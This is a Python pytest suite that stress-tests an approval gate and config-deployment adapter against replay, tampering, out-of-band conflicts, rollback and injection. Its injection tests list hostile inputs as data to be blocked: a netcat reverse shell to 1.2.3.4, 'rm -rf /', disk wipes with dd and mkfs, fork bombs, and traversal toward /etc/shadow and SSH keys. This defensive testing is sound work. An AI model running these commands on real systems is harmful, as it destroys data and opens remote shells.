"""
Adversarial Stress Test Suite for Milestone M3: Target Adapter & Approval Concurrency.
Empirically tests and stress-tests:
1. Replay attacks & double-execution under 20 concurrent threads and HTTP clients.
2. Parameter tampering (commands, hashes, targets, user identity, staged files).
3. Out-of-band destination conflict detection preventing silent overwrites.
4. Broken syntax rollback restoring original content and file permissions.
5. Command injection, subshells, path traversal, and allowlist bypass attacks.
"""
import asyncio
import concurrent.futures
import hashlib
import os
import stat
import time
import uuid
import pytest
import httpx
from pathlib import Path

from backend.services.approval_gate.models import ApprovalRecord
from backend.services.approval_gate.store import ValkeyApprovalStore, get_approval_store
from backend.services.approval_gate.gate import ApprovalGate
from backend.services.approval_gate.filter import (
    evaluate_command_safety,
    normalize_command,
    DANGEROUS_COMMANDS,
    HARDENED_DANGEROUS_PATTERNS,
)
from backend.services.target_adapter.config import (
    validate_target_service,
    validate_target_config_path,
    normalize_service_name,
    CANONICAL_SERVICES,
    ALLOWED_ACTIONS,
)
from backend.services.target_adapter.service_manager import ServiceManager
from backend.services.target_adapter.config_deployer import ConfigDeployer, validate_syntax
from backend.services.target_adapter.adapter import TargetAdapter
from backend.services.target_adapter.models import (
    ProposalRequest,
    ExecutionRequest,
    DecisionRequest,
)
from services.agent_tools import server
from services.auth_gateway import server as auth_gateway


@pytest.fixture(autouse=True)
def allow_tmp_configs(monkeypatch):
    """Enable test fixtures in tmp directories and simulation for service manager."""
    monkeypatch.setenv("TARGET_CONFIG_ALLOW_TMP", "1")
    monkeypatch.setenv("TARGET_ADAPTER_SIMULATION", "1")


# ==============================================================================
# Suite 1: Replay Attacks and Double-Execution Concurrency (20 Concurrent Requests)
# ==============================================================================

def test_store_concurrent_atomic_claims_exactly_one_succeeds():
    """
    Stress-test: Fire 20 concurrent execution claim requests with identical approval token
    directly against ValkeyApprovalStore.
    VERIFY: Exactly ONE thread succeeds, exactly 19 threads fail with ALREADY_EXECUTING
    or ALREADY_CONSUMED. No race condition permits double claiming.
    """
    store = ValkeyApprovalStore()
    appr_id = f"appr-stress-claim-{uuid.uuid4().hex}"
    now = time.time()

    record = ApprovalRecord(
        approval_id=appr_id,
        user_id="sysadmin-01",
        session_id="sess-concurrency",
        workspace="/tmp/ws",
        target="nginx",
        action="service_restart",
        command="systemctl restart nginx.service",
        status="approved",
        created_at=now,
        expires_at=now + 300.0,
    )
    store.create_approval(record)

    results = []

    def claim_worker(worker_id: int):
        res = store.claim_for_execution(
            approval_id=appr_id,
            user_id="sysadmin-01",
            session_id="sess-concurrency",
            workspace="/tmp/ws",
            command="systemctl restart nginx.service",
            target="nginx",
        )
        return worker_id, res

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(claim_worker, i) for i in range(20)]
        for f in concurrent.futures.as_completed(futures):
            results.append(f.result())

    successes = [r for _, r in results if r.get("success") is True]
    failures = [r for _, r in results if r.get("success") is False]

    assert len(successes) == 1, f"Expected exactly 1 claim to succeed, got {len(successes)}"
    assert len(failures) == 19, f"Expected exactly 19 claims to fail, got {len(failures)}"

    for fail in failures:
        assert fail.get("code") in ("ALREADY_EXECUTING", "ALREADY_CONSUMED"), f"Unexpected failure code: {fail}"

    # Confirm final status in store
    final_rec = store.get_approval(appr_id)
    assert final_rec["status"] == "executing"


def test_adapter_concurrent_executions_exactly_one_succeeds():
    """
    Stress-test: Fire 20 concurrent TargetAdapter.execute calls for the same approved token.
    VERIFY: Exactly ONE succeeds (status='succeeded', exit_code=0).
    Exactly 19 fail (status='failed', 'Claim failed' in message).
    """
    store = ValkeyApprovalStore()
    gate = ApprovalGate(store=store)
    svc_mgr = ServiceManager(simulation=True)
    deployer = ConfigDeployer(allow_tmp=True)
    adapter = TargetAdapter(approval_gate=gate, service_manager=svc_mgr, config_deployer=deployer)

    prop = adapter.propose(ProposalRequest(
        user_id="sysadmin-01",
        action="service_restart",
        target="nginx",
        reason="Concurrent stress restart",
    ))
    appr_id = prop.approval_id

    dec = gate.decide(appr_id, approved=True, reviewer="sysadmin-lead", reviewer_role="admin")
    assert dec["success"] is True

    exec_req = ExecutionRequest(
        approval_id=appr_id,
        user_id="sysadmin-01",
        action="service_restart",
        target="nginx",
    )

    results = []

    def execute_worker(worker_id: int):
        res = adapter.execute(exec_req)
        return worker_id, res

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(execute_worker, i) for i in range(20)]
        for f in concurrent.futures.as_completed(futures):
            results.append(f.result())

    succeeded = [r for _, r in results if r.status == "succeeded"]
    failed = [r for _, r in results if r.status == "failed"]

    assert len(succeeded) == 1, f"Expected exactly 1 execution to succeed, got {len(succeeded)}"
    assert len(failed) == 19, f"Expected exactly 19 executions to fail, got {len(failed)}"

    for fail in failed:
        assert "Claim failed" in fail.message


@pytest.mark.asyncio
async def test_http_api_20_concurrent_execution_requests(monkeypatch):
    """
    Stress-test: Fire 20 concurrent HTTP POST /api/v1/adapter/execute requests
    with the exact same approval token via ASGI async client.
    VERIFY: Exactly ONE request returns HTTP 200 OK.
    Exactly 19 requests return an error (HTTP 403 Forbidden / 409 Conflict / 400 Bad Request).
    No duplicate execution occurs.
    """
    monkeypatch.setattr(auth_gateway, "load_valid_tokens", lambda: {
        "user-tok": "sysadmin-01",
        "admin-tok": "sysadmin-admin",
    })

    store = ValkeyApprovalStore()
    gate = ApprovalGate(store=store)
    svc_mgr = ServiceManager(simulation=True)
    deployer = ConfigDeployer(allow_tmp=True)
    adapter = TargetAdapter(approval_gate=gate, service_manager=svc_mgr, config_deployer=deployer)

    from backend.services.target_adapter import router as target_router
    monkeypatch.setattr(target_router, "get_target_adapter", lambda: adapter)

    transport = httpx.ASGITransport(app=server.app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        # Propose
        prop_resp = await client.post(
            "/api/v1/approval/propose",
            json={"user_id": "sysadmin-01", "action": "service_restart", "target": "valkey"},
            headers={"Authorization": "Bearer user-tok"},
        )
        assert prop_resp.status_code == 202
        approval_id = prop_resp.json()["approval_id"]

        # Admin Approve (requiring reviewer and reviewer_role)
        dec_resp = await client.post(
            "/api/v1/approvals/decide",
            json={
                "approval_id": approval_id,
                "approved": True,
                "reviewer": "sysadmin-admin",
                "reviewer_role": "admin",
            },
            headers={"Authorization": "Bearer admin-tok"},
        )
        assert dec_resp.status_code == 200

        # Fire 20 concurrent execution requests
        exec_payload = {"approval_id": approval_id, "user_id": "sysadmin-01"}
        headers = {"Authorization": "Bearer user-tok"}

        tasks = [
            client.post("/api/v1/adapter/execute", json=exec_payload, headers=headers)
            for _ in range(20)
        ]
        responses = await asyncio.gather(*tasks)

        status_codes = [r.status_code for r in responses]
        ok_count = sum(1 for c in status_codes if c == 200)
        err_count = sum(1 for c in status_codes if c in (400, 403, 409))

        assert ok_count == 1, f"Expected exactly 1 HTTP 200 OK, got {ok_count}. All codes: {status_codes}"
        assert err_count == 19, f"Expected exactly 19 error responses, got {err_count}. All codes: {status_codes}"
        # Note status codes returned: 403 Forbidden is returned by router.py
        for r in responses:
            if r.status_code != 200:
                assert r.status_code in (400, 403, 409)
                assert "Claim failed" in r.json().get("detail", "")


def test_sequential_replay_attack_rejected():
    """Verify sequential replay attack: once executed to success, subsequent execution fails."""
    gate = ApprovalGate()
    adapter = TargetAdapter(approval_gate=gate, service_manager=ServiceManager(simulation=True))

    prop = adapter.propose(ProposalRequest(
        user_id="sysadmin-01",
        action="service_restart",
        target="nginx",
    ))
    appr_id = prop.approval_id
    gate.decide(appr_id, approved=True, reviewer="sysadmin-lead", reviewer_role="admin")

    req = ExecutionRequest(approval_id=appr_id, user_id="sysadmin-01")
    first = adapter.execute(req)
    assert first.status == "succeeded"

    # Immediate replay attempt
    replay = adapter.execute(req)
    assert replay.status == "failed"
    assert "Claim failed" in replay.message
    assert "consumed" in replay.message.lower() or "replay" in replay.message.lower()


# ==============================================================================
# Suite 2: Parameter Tampering & Cryptographic Binding
# ==============================================================================

def test_tampering_command_mutation_rejected():
    """Approve command A ('systemctl restart nginx'), execute with command B ('systemctl restart traefik')."""
    gate = ApprovalGate()
    adapter = TargetAdapter(approval_gate=gate, service_manager=ServiceManager(simulation=True))

    prop = adapter.propose(ProposalRequest(
        user_id="sysadmin-01",
        action="service_restart",
        target="nginx",
    ))
    appr_id = prop.approval_id
    gate.decide(appr_id, approved=True, reviewer="sysadmin-lead", reviewer_role="admin")

    # Attacker passes different command
    tampered_req = ExecutionRequest(
        approval_id=appr_id,
        user_id="sysadmin-01",
        command="systemctl restart traefik.service",
    )
    res = adapter.execute(tampered_req)
    assert res.status == "failed"
    assert "Claim failed" in res.message
    assert "command does not match" in res.message.lower() or "command_mismatch" in res.message.lower()


def test_tampering_target_mutation_rejected():
    """Approve target 'nginx', execute with target 'valkey'."""
    gate = ApprovalGate()
    adapter = TargetAdapter(approval_gate=gate, service_manager=ServiceManager(simulation=True))

    prop = adapter.propose(ProposalRequest(
        user_id="sysadmin-01",
        action="service_restart",
        target="nginx",
    ))
    appr_id = prop.approval_id
    gate.decide(appr_id, approved=True, reviewer="sysadmin-lead", reviewer_role="admin")

    # Attacker passes different target
    tampered_req = ExecutionRequest(
        approval_id=appr_id,
        user_id="sysadmin-01",
        target="valkey",
    )
    res = adapter.execute(tampered_req)
    assert res.status == "failed"
    assert "Claim failed" in res.message
    assert "target does not match" in res.message.lower() or "target_mismatch" in res.message.lower()


def test_tampering_content_hash_mutation_rejected():
    """Approve with valid hash, execute with altered content_hash."""
    gate = ApprovalGate()
    adapter = TargetAdapter(approval_gate=gate, service_manager=ServiceManager(simulation=True))

    prop = adapter.propose(ProposalRequest(
        user_id="sysadmin-01",
        action="service_restart",
        target="nginx",
    ))
    appr_id = prop.approval_id
    gate.decide(appr_id, approved=True, reviewer="sysadmin-lead", reviewer_role="admin")

    # Attacker passes altered content_hash
    tampered_req = ExecutionRequest(
        approval_id=appr_id,
        user_id="sysadmin-01",
        content_hash="deadbeef" * 8,
    )
    res = adapter.execute(tampered_req)
    assert res.status == "failed"
    assert "Claim failed" in res.message
    assert "content hash mismatch" in res.message.lower() or "hash_mismatch" in res.message.lower()


def test_tampering_user_identity_mismatch_rejected():
    """Token approved for sysadmin-01; sysadmin-02 tries to claim/execute it."""
    gate = ApprovalGate()
    adapter = TargetAdapter(approval_gate=gate, service_manager=ServiceManager(simulation=True))

    prop = adapter.propose(ProposalRequest(
        user_id="sysadmin-01",
        action="service_restart",
        target="nginx",
    ))
    appr_id = prop.approval_id
    gate.decide(appr_id, approved=True, reviewer="sysadmin-lead", reviewer_role="admin")

    # sysadmin-02 executes
    res = adapter.execute(ExecutionRequest(
        approval_id=appr_id,
        user_id="sysadmin-02",
    ))
    assert res.status == "failed"
    assert "Claim failed" in res.message
    assert "different user" in res.message.lower() or "user_mismatch" in res.message.lower()


def test_tampering_staged_content_modified_before_execution(tmp_path, monkeypatch):
    """
    Staged deployment tamper: Staged file modified in workspace AFTER approval.
    Phase 2 SHA-256 validation must detect mismatch and reject deployment.
    """
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    staged_file = workspace / "nginx.conf"
    staged_file.write_text("worker_processes 1;\n")

    dest_file = tmp_path / "dest_nginx.conf"
    dest_file.write_text("worker_processes 1;\n")

    deployer = ConfigDeployer(allow_tmp=True)
    gate = ApprovalGate()
    adapter = TargetAdapter(approval_gate=gate, config_deployer=deployer)

    # 1. Propose with initial content
    prop = adapter.propose(ProposalRequest(
        user_id="sysadmin-01",
        action="config_deploy",
        target=str(dest_file),
        staged_path="nginx.conf",
        workspace=str(workspace),
    ))
    appr_id = prop.approval_id
    gate.decide(appr_id, approved=True, reviewer="sysadmin-lead", reviewer_role="admin")

    # 2. Tamper staged file in workspace behind the scenes!
    staged_file.write_text("worker_processes 999; # INJECTED ATTACK\n")

    # 3. Attempt execution
    res = adapter.execute(ExecutionRequest(
        approval_id=appr_id,
        user_id="sysadmin-01",
        target=str(dest_file),
        staged_path="nginx.conf",
    ))

    assert res.status == "failed"
    assert "Tamper detected" in res.message
    # Destination content preserved untouched
    assert dest_file.read_text() == "worker_processes 1;\n"


# ==============================================================================
# Suite 3: Out-of-Band Conflict Detection
# ==============================================================================

def test_out_of_band_conflict_aborts_without_overwriting(tmp_path):
    """
    Destination file modified out-of-band between proposal and execution.
    Phase 4 must detect base_hash conflict and abort without overwriting.
    """
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    staged_file = workspace / "app.json"
    staged_file.write_text('{"mode": "staged_v2"}')

    dest_file = tmp_path / "app.json"
    dest_file.write_text('{"mode": "original_v1"}')

    deployer = ConfigDeployer(allow_tmp=True)
    gate = ApprovalGate()
    adapter = TargetAdapter(approval_gate=gate, config_deployer=deployer)

    # Propose
    prop = adapter.propose(ProposalRequest(
        user_id="sysadmin-01",
        action="config_deploy",
        target=str(dest_file),
        staged_path="app.json",
        workspace=str(workspace),
    ))
    appr_id = prop.approval_id
    gate.decide(appr_id, approved=True, reviewer="sysadmin-lead", reviewer_role="admin")

    # Out-of-band modification to destination file!
    dest_file.write_text('{"mode": "out_of_band_v1.5"}')

    # Execute
    res = adapter.execute(ExecutionRequest(
        approval_id=appr_id,
        user_id="sysadmin-01",
        target=str(dest_file),
        staged_path="app.json",
    ))

    assert res.status == "failed"
    assert "Conflict detected" in res.message
    # Destination must retain out-of-band change, NOT staged change
    assert dest_file.read_text() == '{"mode": "out_of_band_v1.5"}'


@pytest.mark.asyncio
async def test_http_out_of_band_conflict(tmp_path, monkeypatch):
    """Verify out-of-band conflict detection through HTTP router."""
    monkeypatch.setattr(auth_gateway, "load_valid_tokens", lambda: {
        "user-tok": "sysadmin-01",
        "admin-tok": "sysadmin-admin",
    })

    from services.agent_runtime import workspace as workspace_module
    ws_dir = tmp_path / "workspaces" / "sysadmin-01"
    ws_dir.mkdir(parents=True)
    staged_file = ws_dir / "config.yaml"
    staged_file.write_text("timeout: 30\n")

    dest_file = tmp_path / "target_config.yaml"
    dest_file.write_text("timeout: 10\n")

    monkeypatch.setattr(workspace_module, "WORKSPACES_DIR", tmp_path / "workspaces")

    transport = httpx.ASGITransport(app=server.app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        # Propose
        prop_res = await client.post(
            "/api/v1/approval/propose",
            json={
                "user_id": "sysadmin-01",
                "action": "config_deploy",
                "target": str(dest_file),
                "staged_path": "config.yaml",
            },
            headers={"Authorization": "Bearer user-tok"},
        )
        assert prop_res.status_code == 202
        approval_id = prop_res.json()["approval_id"]

        # Approve
        dec_res = await client.post(
            "/api/v1/approvals/decide",
            json={
                "approval_id": approval_id,
                "approved": True,
                "reviewer": "sysadmin-admin",
                "reviewer_role": "admin",
            },
            headers={"Authorization": "Bearer admin-tok"},
        )
        assert dec_res.status_code == 200

        # Modify destination out-of-band
        dest_file.write_text("timeout: 99 # concurrent edit\n")

        # Execute
        exec_res = await client.post(
            "/api/v1/adapter/execute",
            json={
                "approval_id": approval_id,
                "user_id": "sysadmin-01",
                "staged_path": "config.yaml",
            },
            headers={"Authorization": "Bearer user-tok"},
        )

        assert exec_res.status_code == 200
        body = exec_res.json()
        assert body["status"] == "failed"
        assert "Conflict detected" in body["message"]
        assert dest_file.read_text() == "timeout: 99 # concurrent edit\n"


# ==============================================================================
# Suite 4: Broken Syntax Rollback & Permissions
# ==============================================================================

def test_broken_syntax_rejected_at_proposal(tmp_path):
    """Deploying broken JSON/YAML rejected at pre-proposal syntax check."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()

    # Broken JSON
    broken_json = workspace / "broken.json"
    broken_json.write_text('{"key": "value", unclosed}')
    adapter = TargetAdapter()

    with pytest.raises(ValueError) as exc:
        adapter.propose(ProposalRequest(
            user_id="sysadmin-01",
            action="config_deploy",
            target=str(tmp_path / "dest.json"),
            staged_path="broken.json",
            workspace=str(workspace),
        ))
    assert "syntax validation failed" in str(exc.value).lower()

    # Broken YAML
    broken_yaml = workspace / "broken.yaml"
    broken_yaml.write_text("key: [unclosed list\n")
    with pytest.raises(ValueError) as exc_yaml:
        adapter.propose(ProposalRequest(
            user_id="sysadmin-01",
            action="config_deploy",
            target=str(tmp_path / "dest.yaml"),
            staged_path="broken.yaml",
            workspace=str(workspace),
        ))
    assert "syntax validation failed" in str(exc_yaml.value).lower()


def test_broken_syntax_deployer_phase3_aborts_without_modification(tmp_path):
    """Direct ConfigDeployer.deploy call with invalid syntax aborts at Phase 3."""
    dest = tmp_path / "production.json"
    dest.write_text('{"prod": true}')

    deployer = ConfigDeployer(allow_tmp=True)
    res = deployer.deploy(
        approval_id="appr-syntax-test",
        user_id="sysadmin-01",
        target_path=str(dest),
        staged_content='{"broken": invalid json',
    )
    assert res["success"] is False
    assert res["status"] == "failed"
    assert "syntax validation failed" in res["message"].lower()
    assert dest.read_text() == '{"prod": true}'


def test_automated_rollback_restores_exact_content_and_permissions(tmp_path, monkeypatch):
    """
    Stress-test atomic rollback:
    1. Destination file exists with mode 0o640 and production content.
    2. Atomic swap executes, but post-swap verification fails (e.g. simulated post-swap syntax error).
    3. Automated rollback (Phase 8) restores backup via os.replace.
    VERIFY: Rollback succeeds, original content restored, and original mode 0o640 preserved.
    """
    deployer = ConfigDeployer(allow_tmp=True)
    dest = tmp_path / "nginx.conf"
    original_content = "events { worker_connections 1024; }\n"
    dest.write_text(original_content)

    # Set explicit file permissions 0o640 (rw-r-----)
    os.chmod(dest, 0o640)
    orig_stat = os.stat(dest)
    orig_mode = stat.S_IMODE(orig_stat.st_mode)
    assert orig_mode == 0o640

    staged_content = "events { worker_connections 2048; }\n"
    proposed_hash = hashlib.sha256(staged_content.encode("utf-8")).hexdigest()
    base_hash = hashlib.sha256(original_content.encode("utf-8")).hexdigest()

    # Intercept post-deployment validation to simulate post-swap verification failure
    real_validate = validate_syntax
    calls = []

    def failing_post_validate(content: str, filename: str):
        calls.append(content)
        # Pre-swap (call 1) succeeds, post-swap (call 2) fails
        if len(calls) == 1:
            return real_validate(content, filename)
        return False, "Simulated post-deployment validation failure"

    monkeypatch.setattr("backend.services.target_adapter.config_deployer.validate_syntax", failing_post_validate)

    res = deployer.deploy(
        approval_id="appr-rollback-test",
        user_id="sysadmin-01",
        target_path=str(dest),
        staged_content=staged_content,
        proposed_hash=proposed_hash,
        base_hash=base_hash,
    )

    assert res["success"] is False
    assert res["status"] == "failed"
    assert res["rollback_performed"] is True

    # VERIFY: Content restored
    assert dest.read_text() == original_content

    # VERIFY: Permissions restored to exact 0o640
    restored_stat = os.stat(dest)
    restored_mode = stat.S_IMODE(restored_stat.st_mode)
    assert restored_mode == 0o640, f"Expected permissions {oct(0o640)}, got {oct(restored_mode)}"


# ==============================================================================
# Suite 5: Command Injection, Subshells, and Allowlist Bypass
# ==============================================================================

@pytest.mark.parametrize("malicious_service", [
    "nginx; rm -rf /",
    "nginx && reboot",
    "nginx | nc -e /bin/sh 1.2.3.4 4444",
    "nginx$(whoami)",
    "nginx`whoami`",
    "nginx\nreboot",
    "nginx\r\nreboot",
    "nginx\x00whoami",
    "nginx;reboot",
    "nginx${IFS}-v",
    "../../../../bin/sh",
    "/bin/systemctl",
    "nginx/../../etc/shadow",
    ".",
    "..",
    "",
    "   ",
])
def test_service_name_injection_and_traversal_blocked(malicious_service):
    """Verify that command separators, subshells, newlines, and path traversal in service names are rejected."""
    with pytest.raises(ValueError):
        normalize_service_name(malicious_service)

    with pytest.raises((ValueError, PermissionError)):
        validate_target_service(malicious_service)


@pytest.mark.parametrize("unauthorized_service", [
    "docker",
    "dockerd",
    "sshd",
    "cron",
    "sudo",
    "apache2",
    "systemd",
    "iptables",
    "ufw",
    "mysql",
    "redis",  # Canonical is 'valkey', bare 'redis' is not whitelisted
])
def test_unauthorized_services_rejected(unauthorized_service):
    """Verify services outside the canonical 9 whitelisted services are strictly rejected."""
    with pytest.raises(PermissionError) as exc:
        validate_target_service(unauthorized_service)
    assert "not in allowable whitelist" in str(exc.value)


@pytest.mark.parametrize("forbidden_path", [
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/sudoers",
    "/etc/sudoers.d/admin",
    "/etc/passwd",
    "/etc/master.passwd",
    "/proc/sys/kernel/core_pattern",
    "/sys/kernel/debug",
    "/dev/sda",
    "/dev/nvme0n1",
    "/boot/vmlinuz",
    "/root/.ssh/authorized_keys",
    "/bin/bash",
    "/usr/bin/python3",
    # Traversal attempts trying to reach forbidden paths
    "/etc/nginx/../../etc/shadow",
    "/etc/traefik/../../../etc/sudoers",
    "/etc/systemd/system/../../proc/sys/kernel/core_pattern",
])
def test_forbidden_target_paths_and_traversal_blocked(forbidden_path):
    """Verify forbidden paths and traversal bypass attempts fail with PermissionError."""
    with pytest.raises(PermissionError):
        validate_target_config_path(forbidden_path, allow_tmp=False)


@pytest.mark.parametrize("dangerous_cmd", [
    "rm -rf /",
    "rm -fr /home",
    "rm --recursive --force /tmp",
    "rm --force --recursive /tmp",
    "rm -r --force /tmp",
    "rm --force -r /tmp",
    "mkfs /dev/sda",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "dd if=/dev/urandom of=/dev/nvme0n1",
    "cat payload > /dev/sda",
    "echo evil > /dev/mapper/vg-root",
    "iptables -F",
    "nft flush ruleset",
    "ufw disable",
    "reboot",
    "shutdown -h now",
    "poweroff",
    "init 0",
    "init 6",
    ":(){ :|:& };:",
    ":(){ : | : & };:",
    "bomb(){ bomb | bomb & }; bomb",
])
def test_hardened_dangerous_commands_unconditionally_blocked(dangerous_cmd):
    """Verify destructive commands and evasion variants are unconditionally BLOCKED."""
    res = evaluate_command_safety(dangerous_cmd)
    assert res["action"] == "BLOCKED", f"Expected BLOCKED for: {dangerous_cmd}, got {res}"
    assert "Security violation" in res["reason"]


@pytest.mark.parametrize("evasion_cmd", [
    "rm -r -f /var/log",
    "rm -f -r /var/log",
    "rm -R -f /var/log",
    "rm -f -R /var/log",
    "rm -f --recursive /var/log",
    "rm --recursive -f /var/log",
    "rm -r -v -f /var/log",
])
def test_destructive_command_split_flags_are_blocked(evasion_cmd):
    """Recursive and force flags are blocked even when passed separately."""
    res = evaluate_command_safety(evasion_cmd)
    assert res["action"] == "BLOCKED"


def test_command_separator_forces_approval():
    """Verify harmless-looking commands joined with semicolons or operators require approval."""
    # Simple 'ls' is ALLOW, but 'ls; whoami' has shell syntax so requires APPROVAL_REQUIRED
    assert evaluate_command_safety("ls")["action"] == "ALLOW"
    assert evaluate_command_safety("ls; whoami")["action"] == "APPROVAL_REQUIRED"
    assert evaluate_command_safety("echo safe && touch file")["action"] == "APPROVAL_REQUIRED"
    assert evaluate_command_safety("cat /tmp/test | grep foo")["action"] == "APPROVAL_REQUIRED"
    assert evaluate_command_safety("id $(whoami)")["action"] == "APPROVAL_REQUIRED"
